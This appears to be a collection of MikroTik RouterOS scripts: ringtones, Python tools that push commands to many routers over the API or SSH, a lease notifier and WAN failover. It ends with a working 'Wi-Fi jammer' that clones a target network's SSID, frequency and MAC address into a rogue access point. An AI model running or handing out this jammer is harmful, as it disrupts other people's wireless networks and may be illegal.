:beep frequency=988 length=300ms;
:delay 310ms;
:delay 300ms;

:beep frequency=1568 length=150ms;
:delay 160ms;
:beep frequency=1480 length=150ms;
:delay 160ms;
:beep frequency=1397 length=150ms;
:delay 160ms;
:beep frequency=1245 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=1319 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=831 length=150ms;
:delay 160ms;
:beep frequency=880 length=150ms;
:delay 160ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=880 length=150ms;
:delay 160ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:beep frequency=1175 length=150ms;
:delay 160ms;
:delay 300ms;

:beep frequency=1568 length=150ms;
:delay 160ms;
:beep frequency=1480 length=150ms;
:delay 160ms;
:beep frequency=1397 length=150ms;
:delay 160ms;
:beep frequency=1245 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=1319 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=2093 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=2093 length=150ms;
:delay 160ms;
:beep frequency=2093 length=150ms;
:delay 160ms;
:delay 600ms;

:beep frequency=1568 length=150ms;
:delay 160ms;
:beep frequency=1480 length=150ms;
:delay 160ms;
:beep frequency=1397 length=150ms;
:delay 160ms;
:beep frequency=1245 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=1319 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=831 length=150ms;
:delay 160ms;
:beep frequency=880 length=150ms;
:delay 160ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:delay 150ms;

:beep frequency=880 length=150ms;
:delay 160ms;
:beep frequency=1047 length=150ms;
:delay 160ms;
:beep frequency=1175 length=150ms;
:delay 160ms;
:delay 300ms;

:beep frequency=1245 length=150ms;
:delay 160ms;
:delay 300ms;

:beep frequency=1175 length=150ms;
:delay 160ms;
:delay 300ms;

:beep frequency=1047 length=150ms;
:delay 160ms;


File: /ringtones\nokia-tune.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Ringtone: Nokia Tune (Granda Valse)
#
# Created with RTTTL to MikroTik RouterOS Script Generator
# https://arktronic.github.io/mikrotik-scripts/rtttl.html
#-------------------------------------------------------------------------------

:beep frequency=1319 length=133ms;
:delay 143ms;
:beep frequency=1175 length=133ms;
:delay 143ms;
:beep frequency=740 length=267ms;
:delay 277ms;
:beep frequency=831 length=267ms;
:delay 277ms;
:beep frequency=1109 length=133ms;
:delay 143ms;
:beep frequency=988 length=133ms;
:delay 143ms;
:beep frequency=587 length=267ms;
:delay 277ms;
:beep frequency=659 length=267ms;
:delay 277ms;
:beep frequency=988 length=133ms;
:delay 143ms;
:beep frequency=880 length=133ms;
:delay 143ms;
:beep frequency=554 length=267ms;
:delay 277ms;
:beep frequency=659 length=267ms;
:delay 277ms;
:beep frequency=880 length=533ms;
:delay 543ms;


File: /ringtones\popcorn.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Ringtone: Popcorn
#
# Created with RTTTL to MikroTik RouterOS Script Generator
# https://arktronic.github.io/mikrotik-scripts/rtttl.html
#-------------------------------------------------------------------------------

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=523 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=440 length=188ms;
:delay 198ms;
:delay 188ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=523 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=440 length=188ms;
:delay 198ms;
:delay 188ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=1047 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=1047 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=698 length=94ms;
:delay 104ms;
:beep frequency=880 length=188ms;
:delay 198ms;
:delay 188ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=523 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=440 length=188ms;
:delay 198ms;
:delay 188ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=523 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=659 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=440 length=188ms;
:delay 198ms;
:delay 188ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=1047 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=1047 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=784 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=880 length=94ms;
:delay 104ms;
:delay 94ms;

:beep frequency=988 length=94ms;
:delay 104ms;
:beep frequency=1047 length=375ms;
:delay 385ms;


File: /ringtones\README.md
# MikroTik RouterOS Ringtones

## Installation

Add content of .rsc files as scripts under `/system script`.

## Usage

Run any ringtone with command like this:

    /system script run RINGTONE_NAME

or schedule execution with command like this:

    /system scheduler add name="RINGTONE_NAME" on-event="/system script run RINGTONE_NAME" interval=10


File: /ringtones\tetris.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Ringtone: Tetris
#
# Created with RTTTL to MikroTik RouterOS Script Generator
# https://arktronic.github.io/mikrotik-scripts/rtttl.html
#-------------------------------------------------------------------------------

:beep frequency=1319 length=375ms;
:delay 385ms;
:beep frequency=988 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=1175 length=188ms;
:delay 198ms;
:beep frequency=1319 length=94ms;
:delay 104ms;
:beep frequency=1175 length=94ms;
:delay 104ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=988 length=188ms;
:delay 198ms;
:beep frequency=880 length=375ms;
:delay 385ms;
:beep frequency=880 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=1319 length=375ms;
:delay 385ms;
:beep frequency=1175 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=988 length=375ms;
:delay 385ms;
:beep frequency=988 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=1175 length=375ms;
:delay 385ms;
:beep frequency=1319 length=375ms;
:delay 385ms;
:beep frequency=1047 length=375ms;
:delay 385ms;
:beep frequency=880 length=375ms;
:delay 385ms;
:beep frequency=880 length=750ms;
:delay 760ms;
:delay 188ms;

:beep frequency=1175 length=375ms;
:delay 385ms;
:beep frequency=1397 length=188ms;
:delay 198ms;
:beep frequency=1760 length=375ms;
:delay 385ms;
:beep frequency=1568 length=188ms;
:delay 198ms;
:beep frequency=1397 length=188ms;
:delay 198ms;
:beep frequency=1319 length=375ms;
:delay 385ms;
:beep frequency=1319 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=1319 length=375ms;
:delay 385ms;
:beep frequency=1175 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=988 length=375ms;
:delay 385ms;
:beep frequency=988 length=188ms;
:delay 198ms;
:beep frequency=1047 length=188ms;
:delay 198ms;
:beep frequency=1175 length=375ms;
:delay 385ms;
:beep frequency=1319 length=375ms;
:delay 385ms;
:beep frequency=1047 length=375ms;
:delay 385ms;
:beep frequency=880 length=375ms;
:delay 385ms;
:beep frequency=880 length=375ms;
:delay 385ms;


File: /run-script-api\application.conf
[application]

timeout=1

boxes_csv=boxes.csv

results_out=results.out


File: /run-script-api\boxes.csv
host,username,password
192.168.10.1,admin,password
192.168.11.1,admin,password
192.168.12.1,admin,


File: /run-script-api\example.api
# This is a comment

/system/resource/print

# Command with parameters as JSON string
/ip/service/set {".id": "*0", "disabled": "yes"}


File: /run-script-api\logging.conf
[loggers]
keys=root

[handlers]
keys=consoleHandler,rotateFileHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=rotateFileHandler

[handler_consoleHandler]
class=StreamHandler
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[handler_rotateFileHandler]
class=handlers.RotatingFileHandler
level=DEBUG
formatter=simpleFormatter
args=('run-script-api.log', 'a', 'maxBytes=10000000','backupCount=5', 'utf8')

[formatter_simpleFormatter]
format=%(asctime)s %(levelname)s %(message)s
datefmt=%Y-%m-%d %H:%M:%S


File: /run-script-api\README.md
# run-script-api

This program runs RouterOS script on a bunch of routers via [API](https://wiki.mikrotik.com/wiki/Manual:API).

## How to use

Install dependencies:

    pip install librouteros

Fill up the [`boxes.csv`](boxes.csv) file.

Create a script to execute. See [`example.api`](example.api).

Run your script:

    run-script-api.py /path/to/script

Check out the `results.out` file.


File: /run-script-api\run-script-api.py
#!/usr/bin/env python

from __future__ import print_function
from datetime import datetime
from librouteros import connect  # https://github.com/luqasz/librouteros
import ConfigParser
import csv
import gzip
import json
import logging
import logging.config
import os
import os.path
import sys


def setup_encoding():  # https://stackoverflow.com/a/40346898
    reload(sys)
    sys.setdefaultencoding('latin-1')


def main():
    if (len(sys.argv)) != 2:
        print('Usage: {0} /path/to/script'.format(sys.argv[0]))
        sys.exit(1)

    script_path = sys.argv[1]
    if (not os.path.isfile(script_path)):
        print('File {0} does not exist'.format(sys.argv[1]))
        sys.exit(1)

    home = os.path.dirname(os.path.abspath(__file__))
    os.chdir(home)

    config = ConfigParser.RawConfigParser()
    config.read('application.conf')
    timeout = float(config.get('application', 'timeout'))
    boxes_csv = config.get('application', 'boxes_csv')
    results_out = config.get('application', 'results_out')

    logging.config.fileConfig('logging.conf')

    setup_encoding()

    boxes = []
    with open(boxes_csv, 'rb') as f:
        reader = csv.DictReader(f)
        fieldnames = reader.fieldnames
        for r in reader:
            boxes.append({fieldnames[i]: r[fieldnames[i]] for i in range(len(fieldnames))})
    logging.info('%d box(es) will be processed', len(boxes))

    script = ''
    with open(script_path) as f:
        script = f.read().splitlines()

    WRITE_BUFFER_SIZE = 0
    with open(results_out, 'wb', WRITE_BUFFER_SIZE) as results_out_f:
        processed = 0
        for box in boxes:
            host = box['host']
            username = box['username']
            password = box['password']

            print('# -----[ {0} ]-----'.format(host), file=results_out_f)
            try:
                logging.info('Processing %s', host)
                api = connect(host=host, username=username, password=password, timeout=timeout)
                for line in script:
                    cmd = line.strip()
                    if (len(cmd) > 0 and not line.startswith('#')):
                        print('# {0}'.format(cmd), file=results_out_f)
                        splitted = cmd.split(' ', 1)
                        command = splitted[0]
                        arguments = dict()
                        if (len(splitted) == 2):
                            arguments = json.loads(splitted[1])
                        result = api(cmd=command, **arguments)
                        print(json.dumps(result), file=results_out_f)
                api.close()
                logging.info('%s done', host)
            except:
                _, exc_value, _ = sys.exc_info()
                logging.error(exc_value)
            processed += 1
            if (processed % 50 == 0):
                logging.info('%d boxes processed', processed)
        logging.info('Total %d box(es) processed', processed)


if __name__ == '__main__':
    main()


File: /run-script-ssh\application.conf
[application]

timeout=1

boxes_csv=boxes.csv

results_out=results.out


File: /run-script-ssh\boxes.csv
host,username,password
192.168.10.1,admin,password
192.168.11.1,admin,password
192.168.12.1,admin,


File: /run-script-ssh\example.rsc
# This is a comment

/system resource print


File: /run-script-ssh\logging.conf
[loggers]
keys=root

[handlers]
keys=consoleHandler,rotateFileHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=rotateFileHandler

[handler_consoleHandler]
class=StreamHandler
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[handler_rotateFileHandler]
class=handlers.RotatingFileHandler
level=DEBUG
formatter=simpleFormatter
args=('run-script-ssh.log', 'a', 'maxBytes=10000000','backupCount=5', 'utf8')

[formatter_simpleFormatter]
format=%(asctime)s %(levelname)s %(message)s
datefmt=%Y-%m-%d %H:%M:%S


File: /run-script-ssh\README.md
# run-script-ssh

This program runs RouterOS script on a bunch of routers via SSH.

Usage:

    run-script-ssh.py /path/to/script


File: /run-script-ssh\run-script-ssh.py
#!/usr/bin/env python

from __future__ import print_function
from datetime import datetime
import ConfigParser
import csv
import gzip
import json
import logging
import logging.config
import os
import os.path
import paramiko
import sys


def main():
    if (len(sys.argv)) != 2:
        print('Usage: {0} /path/to/script'.format(sys.argv[0]))
        sys.exit(1)

    script_path = sys.argv[1]
    if (not os.path.isfile(script_path)):
        print('File {0} does not exist'.format(sys.argv[1]))
        sys.exit(1)

    home = os.path.dirname(os.path.abspath(__file__))
    os.chdir(home)

    config = ConfigParser.RawConfigParser()
    config.read('application.conf')
    timeout = float(config.get('application', 'timeout'))
    boxes_csv = config.get('application', 'boxes_csv')
    results_out = config.get('application', 'results_out')

    logging.config.fileConfig('logging.conf')

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    logging.getLogger("paramiko").setLevel(logging.WARNING)

    boxes = []
    with open(boxes_csv, 'rb') as f:
        reader = csv.DictReader(f)
        fieldnames = reader.fieldnames
        for r in reader:
            boxes.append({fieldnames[i]: r[fieldnames[i]] for i in range(len(fieldnames))})
    logging.info('%d box(es) will be processed', len(boxes))

    script = ''
    with open(script_path) as f:
        script = f.read().splitlines()

    WRITE_BUFFER_SIZE = 0
    with open(results_out, 'wb', WRITE_BUFFER_SIZE) as results_out_f:
        processed = 0
        for box in boxes:
            host = box['host']
            username = box['username']
            password = box['password']

            print('# -----[ {0} ]-----'.format(host), file=results_out_f)
            try:
                logging.info('Processing %s', host)
                ssh_client.connect(hostname=host, username=username, password=password, timeout=timeout)
                for line in script:
                    cmd = line.strip()
                    if (len(cmd) > 0 and not line.startswith('#')):
                        print('# {0}'.format(cmd), file=results_out_f)
                        _, stdout, stderr = ssh_client.exec_command(cmd)
                        result = stdout.read() + stderr.read()
                        if (len(result) > 0):
                            print(result, file=results_out_f)
                ssh_client.close()
                logging.info('%s done', host)
            except:
                _, exc_value, _ = sys.exc_info()
                logging.error(exc_value)
            processed += 1
            if (processed % 50 == 0):
                logging.info('%d boxes processed', processed)
        logging.info('Total %d box(es) processed', processed)


if __name__ == '__main__':
    main()


File: /send-leases-to-activemq.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Send Leases to ActiveMQ
#-------------------------------------------------------------------------------

#-------------------------------------------------------------------------------
# Settings
#-------------------------------------------------------------------------------
:local ACTIVEMQHOST "activemq.tld"
:local ACTIVEMQPORT 8161
:local ACTIVEMQUSER "admin"
:local ACTIVEMQPASSWORD "admin"
:local ACTIVEMQTOPIC "leases"

#-------------------------------------------------------------------------------
# Send Leases to ActiveMQ
#-------------------------------------------------------------------------------
:local url "http://$ACTIVEMQHOST:$ACTIVEMQPORT/api/message/$ACTIVEMQTOPIC"
:local date [/system clock get date]
:local time [/system clock get time]
:local systemIdentity [/system identity get name]
:local message "{\"date\":\"$date\",\"time\":\"$time\",\"systemIdentity\":\"$systemIdentity\",\"bound\":$leaseBound,\"serverName\":\"$leaseServerName\",\"mac\":\"$leaseActMAC\",\"ip\":\"$leaseActIP\"}"
/tool fetch url="$url" http-method="post" user="$ACTIVEMQUSER" password="$ACTIVEMQPASSWORD" http-data="body=$message" keep-result="no"


File: /wan-failover.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS WAN Failover
#-------------------------------------------------------------------------------

#-------------------------------------------------------------------------------
# Settings
#-------------------------------------------------------------------------------
:local PRIMARYROUTELABEL "PRIMARY_ROUTE"
:local BACKUPROUTELABEL "BACKUP_ROUTE"
# Hosts to ping via primary route (Yandex.DNS)
:local PRIMARYHOSTS {77.88.8.8; 77.88.8.7}
# Hosts to ping via backup route (Yandex.DNS)
:local BACKUPHOSTS {77.88.8.1; 77.88.8.3}
:local PINGCOUNT 3
:local PINGTRESHOLD 70

#-------------------------------------------------------------------------------
# Check primary route
#-------------------------------------------------------------------------------
:local primaryOk false
:local primarySuccessPingCount 0
:foreach host in=$PRIMARYHOSTS do={
    :local n [/ping $host count=$PINGCOUNT]
    :set primarySuccessPingCount ($primarySuccessPingCount + $n)
}
:set primaryOk (($primarySuccessPingCount * 100) >= ([:len $PRIMARYHOSTS] * $PINGCOUNT * $PINGTRESHOLD))
:if (!$primaryOk) do={
    :log error "Primary internet connection down"
}

#-------------------------------------------------------------------------------
# Check backup route
#-------------------------------------------------------------------------------
:local backupOk false
:local backupSuccessPingCount 0
:foreach host in=$BACKUPHOSTS do={
    :local n [/ping $host count=$PINGCOUNT]
    :set backupSuccessPingCount ($backupSuccessPingCount + $n)
}
:set backupOk (($backupSuccessPingCount * 100) >= ([:len $BACKUPHOSTS] * $PINGCOUNT * $PINGTRESHOLD))
:if (!$backupOk) do={
    :log error "Backup internet connection down"
}

#-------------------------------------------------------------------------------
# Failover
#-------------------------------------------------------------------------------
:local primaryDistance [/ip route get [find comment=$PRIMARYROUTELABEL] distance]
:local backupDistance [/ip route get [find comment=$BACKUPROUTELABEL] distance]
:if ($primaryOk && ($primaryDistance >= $backupDistance)) do={
# Switch to primary route
    /ip route set [find comment=$PRIMARYROUTELABEL] distance=1
    /ip route set [find comment=$BACKUPROUTELABEL] distance=2
    :log warning "Switched to primary internet connection"
# Remove all connections
    /ip firewall connection tracking set enabled=no
    :delay 5s
    /ip firewall connection tracking set enabled=yes
}
:if (!$primaryOk && $backupOk && ($primaryDistance <= $backupDistance)) do={
# Switch to backup route
    /ip route set [find comment=$PRIMARYROUTELABEL] distance=2
    /ip route set [find comment=$BACKUPROUTELABEL] distance=1
    :log error "Switched to backup internet connection"
# Remove all connections
    /ip firewall connection tracking set enabled=no
    :delay 5s
    /ip firewall connection tracking set enabled=yes
}


File: /wifi-jammer\README.md
# MikroTik RouterOS Wi-Fi Jammer

Wi-Fi Jammer jams some target access point (identified by SSID) by creating rogue access point with the same SSID/frequency/MAC address.

## Disclaimer

This project is a proof of concept for experimental and educational purposes.

Please don't abuse this project as it may be illegal in your country.

## Installation

Revise the Settings section of `wifi-jammer.rsc`.

Add content of revised `wifi-jammer.rsc` as a script with name `wifi-jammer` under `/system script`.

Schedule execution of the script with command like this:

    /system scheduler add name="wifi-jammer" on-event="/system script run wifi-jammer" interval=10

## Removal

To uninstall Wi-Fi Jammer use this commands:

    /system scheduler remove "wifi-jammer"
    /system script remove "wifi-jammer"


File: /wifi-jammer\wifi-jammer.rsc
#-------------------------------------------------------------------------------
# MikroTik RouterOS Wi-Fi Jammer
#-------------------------------------------------------------------------------

#-------------------------------------------------------------------------------
# Settings
#-------------------------------------------------------------------------------
:local TARGETSSID "SomeSSID"
:local SCANDATFILENAME "scan.dat"
:local SCANDURATION 5
:local BASESCHEDULEDELAY 5

#-------------------------------------------------------------------------------
# Jammer
#-------------------------------------------------------------------------------
:foreach iface in=[/interface wireless find] do={
  /interface wireless scan $iface duration=$SCANDURATION save-file=$SCANDATFILENAME
  /interface wireless reset-configuration $iface
  :local text [/file get $SCANDATFILENAME contents]
  :local textLen [:len $text]
  :local startPos 0
  :local endPos 0
  :local line ""
  :do {
    :set endPos [:find $text "\n" $endPos]
    :set line [:pick $text $startPos $endPos]
    :set startPos ($endPos + 1)
    :local data [:toarray $line]
    :local mac [:pick $data 0]
    :local ssid [:pick $data 1]
    :local freq [:pick [:pick $data 2] 0 [:find [:pick $data 2] "/"]]
    :if ($ssid="'" . $TARGETSSID . "'") do={
      /interface wireless security-profiles set 0 mode=none supplicant-identity=""
      /interface wireless set $iface mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac radio-name="" wps-mode=disabled
      /interface wireless enable $iface
      :log info "Jammed: $TARGETSSID $freq $mac"
    }
  } while ($startPos < $textLen)
}
/file remove $SCANDATFILENAME
:local random [:pick [/system clock get time] 7]
/system scheduler set "wifi-jammer" interval=($BASESCHEDULEDELAY + $random)


